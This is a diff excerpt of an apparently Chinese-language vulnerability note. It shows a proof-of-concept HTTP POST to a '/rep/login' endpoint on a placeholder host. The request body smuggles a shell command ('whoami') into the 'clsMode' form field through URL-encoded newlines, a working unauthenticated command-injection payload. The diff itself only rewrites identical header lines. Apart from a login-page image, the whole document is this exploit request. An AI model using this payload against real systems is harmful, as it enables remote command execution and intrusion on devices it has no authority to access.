@@ -47,25 +47,25 @@ fid="iaytNA57019/kADk8Nev7g=="
 访问登录界面![](https://mmbiz.qpic.cn/sz_mmbiz_png/fZjIoPoMagxL87lh7HcwawaSsEVebeVvhUibCbfnoJopsu2XVemnO12cj6utTLia464gcO5BZVJz8f62wjicYS5Xg/640?wx_fmt=png) POC
 
 ```
-POST /rep/login HTTP/1.1
-Host: 1.1.1.1:85
-Cookie: UEDC_LOGIN_POLICY_VALUE=checked
-Content-Length: 124
-Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
-Accept: */*
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-X-Requested-With: XMLHttpRequest
-Sec-Ch-Ua-Mobile: ?0
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
-Sec-Ch-Ua-Platform: "Windows"
-Origin: https://1.1.1.1
-Sec-Fetch-Site: same-origin
-Sec-Fetch-Mode: cors
-Sec-Fetch-Dest: empty
-Referer: https://1.1.1.1:85/rep/login
-Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9
-Connection: close
+POST /rep/login HTTP/1.1
+Host: 1.1.1.1:85
+Cookie: UEDC_LOGIN_POLICY_VALUE=checked
+Content-Length: 124
+Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
+Accept: */*
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Sec-Ch-Ua-Mobile: ?0
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://1.1.1.1
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: cors
+Sec-Fetch-Dest: empty
+Referer: https://1.1.1.1:85/rep/login
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
 
 clsMode=cls_mode_login%0Awhoami%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
 
